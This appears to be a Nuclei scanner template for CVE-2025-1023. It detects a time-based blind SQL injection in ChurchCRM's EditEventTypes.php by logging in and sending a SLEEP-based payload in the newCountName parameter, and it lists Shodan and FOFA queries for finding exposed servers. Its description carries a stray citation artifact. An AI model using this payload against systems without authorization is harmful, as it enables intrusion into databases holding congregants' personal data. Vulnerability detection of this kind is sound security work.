id: CVE-2025-1023

info:
  name: ChurchCRM â€“ Time-Based Blind SQL Injection in EditEventTypes (newCountName parameter)
  author: hnd3884
  severity: critical
  description: |
    A time-based blind SQL injection vulnerability exists in ChurchCRM version 5.13.0 and prior within the EditEventTypes functionality. The `newCountName` parameter is concatenated directly into an SQL query without proper sanitization, enabling a remote attacker to execute arbitrary SQL queries, potentially leading to data exfiltration, modification, or deletion. :contentReference[oaicite:2]{index=2}
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-1023
    - https://github.com/projectdiscovery/nuclei-templates/issues/13792
    - https://www.cvedetails.com/cve/CVE-2025-1023/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-1023
    cwe-id: CWE-89
    epss-score: 0.95
    epss-percentile: 0.99
    cpe: cpe:2.3:a:churchcrm:churchcrm:*:*:*:*:*:*:*:*
  metadata:
    vendor: churchcrm
    product: churchcrm
    affected-versions:
      - "<= 5.13.0"
    shodan-query:
      - product:"ChurchCRM"
      - http.title:"ChurchCRM"
    fofa-query: product="ChurchCRM"
  tags: cve,cve2025,churchcrm,sqli,sql-injection,remote

flow: |
  http(1) && http(2) && http(3)

http:
  - id: login
    raw:
      - |
        POST /session/begin HTTP/1.1
        Host: {{Hostname}}
        Referer: {{BaseURL}}/session/begin
        Content-Type: application/x-www-form-urlencoded
        Origin: {{BaseURL}}

        User={{username}}&Password={{password}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
        internal: true
      - type: word
        words:
          - "Location: /v2/dashboard"
        part: header
        internal: true

  - id: start-session
    raw:
      - |
        GET /v2/dashboard HTTP/1.1
        Host: {{Hostname}}
        Referer: {{BaseURL}}/session/begin
        Connection: keep-alive

    matchers:
      - type: status
        status:
          - 200
        internal: true

  - id: timebased-sql-injection
    raw:
      - |
        POST /EditEventTypes.php HTTP/1.1
        Host: {{Hostname}}
        Referer: {{BaseURL}}/EditEventTypes.php
        Content-Type: application/x-www-form-urlencoded

        EN_tyid=1&EN_ctid=&newEvtName=Church+Service&newEvtStartTime=10%3A30%3A00&newCountName=4'+AND+(SELECT+6419+FROM+(SELECT(SLEEP(6)))PYsF)+AND+'KmGS'%3d'KmGS&Action=ADD
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code == 500 && duration >= 6"
